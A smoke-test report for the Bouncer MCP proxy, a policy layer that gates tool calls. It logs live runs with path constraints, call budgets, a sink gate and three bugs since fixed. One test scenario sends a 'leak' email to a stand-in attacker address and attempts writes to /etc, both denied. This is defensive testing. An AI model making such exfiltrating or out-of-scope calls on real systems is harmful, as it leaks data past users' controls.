# Manual smoke test — Bouncer MCP proxy (Task 13)

A live, end-to-end exercise of the Bouncer proxy against the reference
filesystem MCP server, plus a direct-engine exercise for the scenarios the proxy
cannot yet configure. **Every terminal excerpt and every `audit.jsonl` line
below was actually captured on 2026-07-06** on macOS (Darwin 25.5.0), node
v25.2.1, `@modelcontextprotocol/server-filesystem` (latest via `npx -y`).

Nothing here is invented. Where a scenario could not be demonstrated through the
proxy, that is stated plainly and the real reason is recorded.

> **RE-RUN UPDATE (2026-07-06, after the fix):** the original run reproduced
> Bug 1 (`Output validation error`), Finding 1 (no user policy) and Finding 2
> (`delete_file` mismatch). After the fix commit
> (`fix(bouncer): relay upstream structuredContent, load user policy in serve,
> correct filesystem pack`) the smoke driver was **re-run live** and now
> passes: the ALLOWED write succeeds end-to-end, and a user policy passed via
> `bouncer run --policy` enforces the constraint and budget scenarios THROUGH
> the proxy. The failing excerpts below are kept for provenance and each is
> annotated with its now-passing re-run result. The new "Re-run after the fix"
> section holds the fresh captured output.

---

## TL;DR of what was observed

| # | Scenario | Path exercised | Verdict observed | Notes |
|---|----------|----------------|------------------|-------|
| a | `read_file`, then `write_file` into `./out` | **live proxy** | engine **ALLOW**; **now succeeds end-to-end** | Was Bug 1 (transport); **fixed** — see Re-run. |
| b | `write_file` to `/etc/x` | **live proxy (with `--policy`)** | proxy **DENY** (constraint) | `--policy` now loadable — Finding 1 **fixed**; see Re-run. |
| c | write budget 3× (`max_calls=2`) | **live proxy (with `--policy`)** | ALLOW / **DENY** / DENY (budget) | The 1st allowed-prefix write ALLOWs, the 2nd and 3rd DENY on budget — because the earlier constraint-denied `/etc` write (row b) already consumed a budget slot. Demonstrated on the real `write_file` tool (no delete tool exists). |
| d | sink gate (exfiltrating send + tainted output) | **direct engine** (+ automated suite) | ALLOW / **DENY** / ASK | Filesystem server has no send tool — see Reconciliation. |

**The two findings and the bug reproduced in the first run are now FIXED and
re-verified live (see "Re-run after the fix"). The original excerpts are kept
below for provenance.**

---

## Environment / setup (all commands really run)

```bash
cd /Users/nishit/Desktop/Projects/Fable/bouncer
node --version   # v25.2.1
npx --version    # 11.6.2
mkdir -p smoke_work/out
```

Throwaway client config (`smoke_work/mcp-config.json`), before wrapping:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem",
               "/Users/nishit/Desktop/Projects/Fable/bouncer/smoke_work"]
    }
  }
}
```

### Step 1 — `bouncer init` wraps the server (real output)

```bash
printf 'y\n' | uv run bouncer init --config smoke_work/mcp-config.json
```

The `filesystem` entry was rewritten to launch `bouncer run` and stash the
original launch command under the `x-bouncer-upstream` sentinel:

```json
"filesystem": {
  "command": "bouncer",
  "args": ["run", "--config",
           "/Users/nishit/Desktop/Projects/Fable/bouncer/smoke_work/mcp-config.json",
           "--upstream-name", "filesystem"],
  "x-bouncer-upstream": {
    "command": "npx",
    "args": ["-y", "@modelcontextprotocol/server-filesystem",
             "/Users/nishit/Desktop/Projects/Fable/bouncer/smoke_work"]
  }
}
```

Wrapping is correct and idempotent (a second `init` prints "No changes").

### Step 2 — drive the wrapped proxy with a scripted MCP client

Claude Code is not scriptable from this environment, so a small scripted MCP
client stands in for it: `scripts/smoke_driver.py` launches `bouncer run` as the
stdio MCP *server* and acts as a *client* (list tools, call tools). This is a
legitimate stand-in and gives real results.

```bash
uv run python scripts/smoke_driver.py
```

Real `tools/list` from the live server (through the proxy):

```
=== tools/list (real names from live server) ===
  - read_file
  - read_text_file
  - read_media_file
  - read_multiple_files
  - write_file
  - edit_file
  - create_directory
  - list_directory
  - list_directory_with_sizes
  - directory_tree
  - move_file
  - search_files
  - get_file_info
  - list_allowed_directories
```

**Note:** there is NO `delete_file` and NO exfiltrating/send tool in this list.

Real per-call output **from the original (pre-fix) run** (kept for provenance;
see "Re-run after the fix" above for the now-passing output):

```
--- a1 read_file: read_file({'path': '.../smoke_work/mcp-config.json'}) ---
ERROR/DENY: Output validation error: outputSchema defined but no structured output returned

--- a2 write_file into out: write_file({'path': '.../smoke_work/out/hello.txt', 'content': 'hello from smoke'}) ---
ERROR/DENY: Output validation error: outputSchema defined but no structured output returned

--- b write_file to /etc: write_file({'path': '/etc/bouncer_should_not_write.txt', 'content': 'nope'}) ---
ERROR/DENY: Output validation error: outputSchema defined but no structured output returned

--- c delete #1..#3: delete_file({'path': '.../out/hello.txt'}) ---
ERROR/DENY: [bouncer blocked] unknown or changed tool schema   (x3)
```

### Step 3 — the real proxy audit log

The proxy writes to `~/.bouncer/audit.jsonl` (started empty for this run).
Captured contents (verbatim):

```json
{"tool": "read_file", "args": {"path": ".../smoke_work/mcp-config.json"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "write_file", "args": {"path": ".../smoke_work/out/hello.txt", "content": "hello from smoke"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "write_file", "args": {"path": "/etc/bouncer_should_not_write.txt", "content": "nope"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "delete_file", "args": {"path": ".../out/hello.txt"}, "verdict": "ask", "reason": "unknown or changed tool schema", "contract": "pinning"}
{"tool": "delete_file", "args": {"path": ".../out/hello.txt"}, "verdict": "ask", "reason": "unknown or changed tool schema", "contract": "pinning"}
{"tool": "delete_file", "args": {"path": ".../out/hello.txt"}, "verdict": "ask", "reason": "unknown or changed tool schema", "contract": "pinning"}
```

Interpretation of these six audited lines:

- **(a)** `read_file` and `write_file`→`./out` were audited **ALLOW / default** —
  the engine allowed correctly. The `smoke_work/out/hello.txt` file (16 bytes,
  "hello from smoke") was in fact written by the upstream server, so the forward
  *did* reach upstream. The `Output validation error` the client saw happens
  **after** the successful upstream call, while the SDK server assembles the
  response — this is **Bug 1**, a transport-layer defect, not an engine denial.
- **(b)** `write_file`→`/etc/x` was audited **ALLOW / default**, *not* DENY. The
  filesystem pack ships `write_file.allowed_path_prefixes: []` (open), and the
  proxy loads **only** the packs — it never loads a user YAML — so nothing closes
  the prefix. This is **Finding 1**. (The `/etc` file was NOT created, because the
  upstream filesystem server independently rejects paths outside its allowed dir
  — but Bouncer's own contract did not deny it.)
- **(c)** the three `delete_file` calls were audited **ASK / pinning** ("unknown
  or changed tool schema"), never reaching the budget check — because
  `delete_file` is not a real tool on this server and so was never pinned at
  startup. With no client elicitation, ASK fails closed to DENY. This is
  **Finding 2** (the pack's own TODO, now verified live).

---

## Re-run after the fix (2026-07-06) — the proof

All captured live after the fix commit. `scripts/smoke_driver.py` is the
original driver; `scripts/smoke_driver_policy.py` is a new driver that launches
`bouncer run … --policy smoke_work/user-policy.yaml`.

### (a) ALLOW forward now succeeds end-to-end (Bug 1 fixed)

`uv run python scripts/smoke_driver.py` — real per-call output (verbatim):

```
--- a1 read_file: read_file({'path': '.../smoke_work/mcp-config.json'}) ---
OK: { ...file contents... }

--- a2 write_file into out: write_file({'path': '.../smoke_work/out/hello.txt', 'content': 'hello from smoke'}) ---
OK: Successfully wrote to .../smoke_work/out/hello.txt

--- b write_file to /etc: write_file({'path': '/etc/bouncer_should_not_write.txt', 'content': 'nope'}) ---
ERROR/DENY: Access denied - path outside allowed directories: /etc/... (upstream server error, relayed faithfully via isError)
```

No more `Output validation error`. The proxy now relays the upstream
`CallToolResult` (its `content` + `structuredContent` + `isError`) verbatim, so
the SDK's outputSchema validation passes. The `/etc` line here (no user policy)
is the *upstream* filesystem server's own refusal, surfaced faithfully as an
error result — distinct from a Bouncer DENY.

### (b) + (c) user policy enforces THROUGH the proxy (Finding 1 fixed)

`smoke_work/user-policy.yaml` (throwaway) layered over the packs via `--policy`:

```yaml
write_file:
  write_params: [path]
  allowed_path_prefixes: [".../smoke_work/out"]
  max_calls: 2
```

`uv run python scripts/smoke_driver_policy.py` — real output (verbatim):

```
--- b write_file to /etc: write_file({'path': '/etc/bouncer_should_not_write.txt', 'content': 'nope'}) ---
ERROR/DENY: [bouncer blocked] path='/etc/bouncer_should_not_write.txt' outside allowed prefixes ['.../smoke_work/out']

--- c write #1 into out ---  OK: Successfully wrote to .../out/note1.txt
--- c write #2 into out ---  ERROR/DENY: [bouncer blocked] call budget 2 for 'write_file' exceeded
--- c write #3 into out ---  ERROR/DENY: [bouncer blocked] call budget 2 for 'write_file' exceeded
```

Real proxy audit log (`~/.bouncer/audit.jsonl`) for this run, verbatim:

```json
{"tool": "write_file", "args": {"path": "/etc/bouncer_should_not_write.txt", "content": "nope"}, "verdict": "deny", "reason": "path='/etc/bouncer_should_not_write.txt' outside allowed prefixes ['.../smoke_work/out']", "contract": "constraint"}
{"tool": "write_file", "args": {"path": ".../out/note1.txt", "content": "ok"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "write_file", "args": {"path": ".../out/note2.txt", "content": "ok"}, "verdict": "deny", "reason": "call budget 2 for 'write_file' exceeded", "contract": "budget"}
{"tool": "write_file", "args": {"path": ".../out/note3.txt", "content": "ok"}, "verdict": "deny", "reason": "call budget 2 for 'write_file' exceeded", "contract": "budget"}
```

**This is not a clean "2 allowed, then a 3rd denied" budget demo.** The engine's
`_check_budget` runs *before* `_check_constraints`, and the budget counter
increments on every call that reaches it — regardless of the eventual verdict.
So the constraint-denied `/etc` write above (call attempt #1 against
`write_file`) already consumed one of the two budget slots. The four calls to
`write_file` in this run, in order, were:

1. `/etc/...` — DENIED by **constraint** (outside allowed prefixes), but this
   attempt still incremented the `write_file` budget counter to 1.
2. `note1.txt` — budget counter now 2, still `<= max_calls=2`, so it's
   **ALLOWED**.
3. `note2.txt` — budget counter would be 3, over `max_calls=2`, so it's
   **DENIED by budget**. This is the *second* allowed-prefix write, not the
   third.
4. `note3.txt` — also **DENIED by budget** for the same reason.

So only one allowed-prefix write (`note1.txt`) ever gets through, not two. The
practical takeaway: budgets count *attempts*, including calls denied by other
contracts — the conservative/fail-safe choice, since it means a denied call
still "costs" quota rather than being free to retry indefinitely.

**DENY-never-forwards confirmed live:** only `note1.txt` exists on disk after the
run; `note2.txt`/`note3.txt` (both budget-DENY) were never written, i.e. the
upstream was never reached. The `/etc` DENY is now Bouncer's *own* constraint
(`contract: constraint`), not the upstream server's refusal.

> Note on tool choice: scenario (c) is demonstrated on the real `write_file`
> tool (with a user `max_calls`) because the reference server exposes **no
> delete tool** — see Finding 2, now fixed in the pack.

---

## Findings (real, reproduced — now fixed, see Re-run above)

### Finding 1 — the proxy cannot load a user-policy YAML

`BouncerProxy.serve` (`src/bouncer/proxy.py`, ~line 151) builds its engine as:

```python
engine = ContractEngine(
    resolver=PolicyResolver(overrides=load_policies(builtin_pack_paths())),
    ...
)
```

It loads **only** the builtin packs. There is no parameter or config field for a
user contract YAML. Consequently the constraint scenario (b) — which requires
`write_file.allowed_path_prefixes: ["./out"]` — **cannot be configured through
the proxy**, and the filesystem pack deliberately leaves that list empty
(`allowed_path_prefixes: []  # left open; users set their own in bouncer.yaml`).
So through the proxy, `write_file` to any path is ALLOW.

This is a genuine gap for the intended workflow. It is a **separate fix** (not
patched in this task): the proxy / CLI `run` needs to accept a user-policy path
and pass `load_policies(builtin_pack_paths() + [user_yaml])` into the engine.

### Finding 2 — pack tool-name mismatch: `delete_file` is not exposed

The live `@modelcontextprotocol/server-filesystem` `tools/list` (captured above)
does **not** include `delete_file` (nor any delete tool). The pack already
flagged this:

```yaml
# delete_file: not exposed by the official reference server as of this writing;
# TODO: verify against live filesystem server schema
delete_file:
  write_params: [path]
  max_calls: 2
```

**Live verification result: the TODO is confirmed — the reference server exposes
no `delete_file`.** The pack's `delete_file` entry is dead against the official
server (it would only bind on a fork that adds such a tool). No pack change is
made here (out of scope), but this is the exact live check the TODO asked for.

### Bug 1 — proxy returns unstructured output for tools that declare an `outputSchema`

Every ALLOW-and-forward call failed at the transport layer with:

```
Output validation error: outputSchema defined but no structured output returned
```

Root cause, confirmed live: the reference server declares an `outputSchema` on
its tools. Captured directly from the live server:

```
### read_file
outputSchema: {"type":"object","properties":{"content":{"type":"string"}},"required":["content"],"additionalProperties":false}
### write_file
outputSchema: {"type":"object","properties":{"content":{"type":"string"}},"required":["content"],"additionalProperties":false}
```

The proxy re-exports the upstream tools 1:1 (`_run_server` returns the original
`tools` list, including their `outputSchema`, `src/bouncer/proxy.py` ~line 169),
but its `_call_tool` handler returns only:

```python
return [mcp_types.TextContent(type="text", text=text)]   # ~line 189
```

i.e. no `structuredContent`. The MCP SDK *server* enforces the declared
`outputSchema` against the outgoing response and rejects it. The upstream call
already succeeded (the file was written), so this is purely a response-assembly
defect on the ALLOW path.

There is no Python traceback surfaced to the client — the SDK converts it into an
`isError=True` tool result whose text is the `Output validation error ...`
message shown above. This reproduces on **every** tool that declares an
`outputSchema`, i.e. every read/write call against this server.

This is the first true end-to-end exercise of the async proxy and it surfaced a
real bug. Per the task rules, **proxy.py was NOT patched here** — this is a
separate fix. A likely fix is for the proxy to forward the upstream result's
`structuredContent` (and/or `content`) through unchanged rather than re-wrapping
only the flattened text, or to strip `outputSchema` from the re-exported tools.

---

## Reconciliation of scenarios (b), (c), (d) with the plan

The brief's Step 2 assumes the filesystem server exposes a `delete_file` and a
"send" tool. Neither assumption holds against the real reference server (see
Findings 1–2 and below). To produce honest results for the *contracts* those
scenarios test, the engine was driven **directly** — with the **real tool names
and inputSchemas captured from the live server** — layering a realistic user
policy over the packs. This is the construction path the engine allows and is a
faithful test of the same contract code the proxy uses; only the transport is
bypassed.

Driver: `scripts/smoke_engine.py`. User policy layered over the packs:

```yaml
write_file:
  write_params: [path]
  allowed_path_prefixes: ["./out"]
delete_file:
  write_params: [path]
  max_calls: 2
send_email:                       # NOT a filesystem tool — sink-gate demo only
  exfiltrating: true
  sink_params: [to]
  trusted_destinations: ["ok@corp.com"]
```

Real output:

```
=== (b) constraint: write_file allowed_path_prefixes=['./out'] ===
b1 write ./out/note.txt: ALLOW [default]
b2 write /etc/x: DENY [constraint] path='/etc/x' outside allowed prefixes ['./out']

=== (c) budget: delete_file max_calls=2 ===
c delete #1: ALLOW [default]
c delete #2: ALLOW [default]
c delete #3: DENY [budget] call budget 2 for 'delete_file' exceeded

=== (d) sink gate: exfiltrating send_email, tainted destination ===
d1 send to trusted ok@corp.com: ALLOW [default]
d2 send to tainted attacker@evil.com: DENY [sink_gate] destination to='attacker@evil.com' came from untrusted data
d3 send to unproven new@random.com: ASK [sink_gate] destination to='new@random.com' is not a vouched recipient
```

Real engine audit log (`smoke_work/engine-audit.jsonl`), verbatim:

```json
{"tool": "write_file", "args": {"path": "./out/note.txt", "content": "ok"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "write_file", "args": {"path": "/etc/x", "content": "nope"}, "verdict": "deny", "reason": "path='/etc/x' outside allowed prefixes ['./out']", "contract": "constraint"}
{"tool": "delete_file", "args": {"path": "./out/note.txt"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "delete_file", "args": {"path": "./out/note.txt"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "delete_file", "args": {"path": "./out/note.txt"}, "verdict": "deny", "reason": "call budget 2 for 'delete_file' exceeded", "contract": "budget"}
{"tool": "send_email", "args": {"to": "ok@corp.com", "body": "hi"}, "verdict": "allow", "reason": "", "contract": "default"}
{"tool": "send_email", "args": {"to": "attacker@evil.com", "body": "leak"}, "verdict": "deny", "reason": "destination to='attacker@evil.com' came from untrusted data", "contract": "sink_gate"}
{"tool": "send_email", "args": {"to": "new@random.com", "body": "hi"}, "verdict": "ask", "reason": "destination to='new@random.com' is not a vouched recipient", "contract": "sink_gate"}
```

### Scenario (d) — the sink gate could NOT be demonstrated through the proxy

The filesystem server exposes **no exfiltrating/send tool** (see `tools/list`
above), so the deny-unless-trusted sink gate cannot be shown against it. No fake
"send" was performed. Instead:

1. The sink gate is covered by the automated suite. Run really executed here:

   ```
   $ uv run pytest tests/test_engine_sink_gate.py -q
   ...........
   11 passed in 0.03s
   ```

2. It is additionally demonstrated live above by driving the `ContractEngine`
   directly with an exfiltrating `send_email` ToolSpec and a recorded tainted
   output containing `attacker@evil.com`: the tainted destination returns
   **DENY [sink_gate]**, the trusted destination ALLOWs, and an unproven one
   ASKs. This is real captured output, not from the filesystem server.

---

## Reproduce it yourself

```bash
cd /Users/nishit/Desktop/Projects/Fable/bouncer
mkdir -p smoke_work/out
# (smoke_work/ is NOT committed — its paths are machine-specific. Create
#  smoke_work/mcp-config.json and smoke_work/user-policy.yaml as shown in the
#  README's "Demo" section, then run bouncer init against the config.)

# Live proxy exercise (produces ~/.bouncer/audit.jsonl):
uv run python scripts/smoke_driver.py
cat ~/.bouncer/audit.jsonl

# Direct-engine exercise for constraint / budget / sink gate:
uv run python scripts/smoke_engine.py
cat smoke_work/engine-audit.jsonl

# Automated sink-gate coverage:
uv run pytest tests/test_engine_sink_gate.py -q
```

## Status

**Original run: DONE_WITH_CONCERNS** — surfaced Bug 1, Finding 1, Finding 2.

**Re-run after the fix (2026-07-06): DONE.** All three are fixed and
re-verified live (see "Re-run after the fix"):
- Bug 1 — the proxy now relays the upstream `CallToolResult`
  (`content` + `structuredContent` + `isError`) verbatim; the ALLOWED write
  succeeds end-to-end with no `Output validation error`.
- Finding 1 — `bouncer run --policy <yaml>` (and `BouncerProxy.serve(...,
  user_policy=...)`) now layers a user contract over the packs; the constraint
  and budget scenarios enforce through the proxy.
- Finding 2 — `src/bouncer/packs/filesystem.yaml` no longer lists the
  non-existent `delete_file`; its tool names were verified live on 2026-07-06.
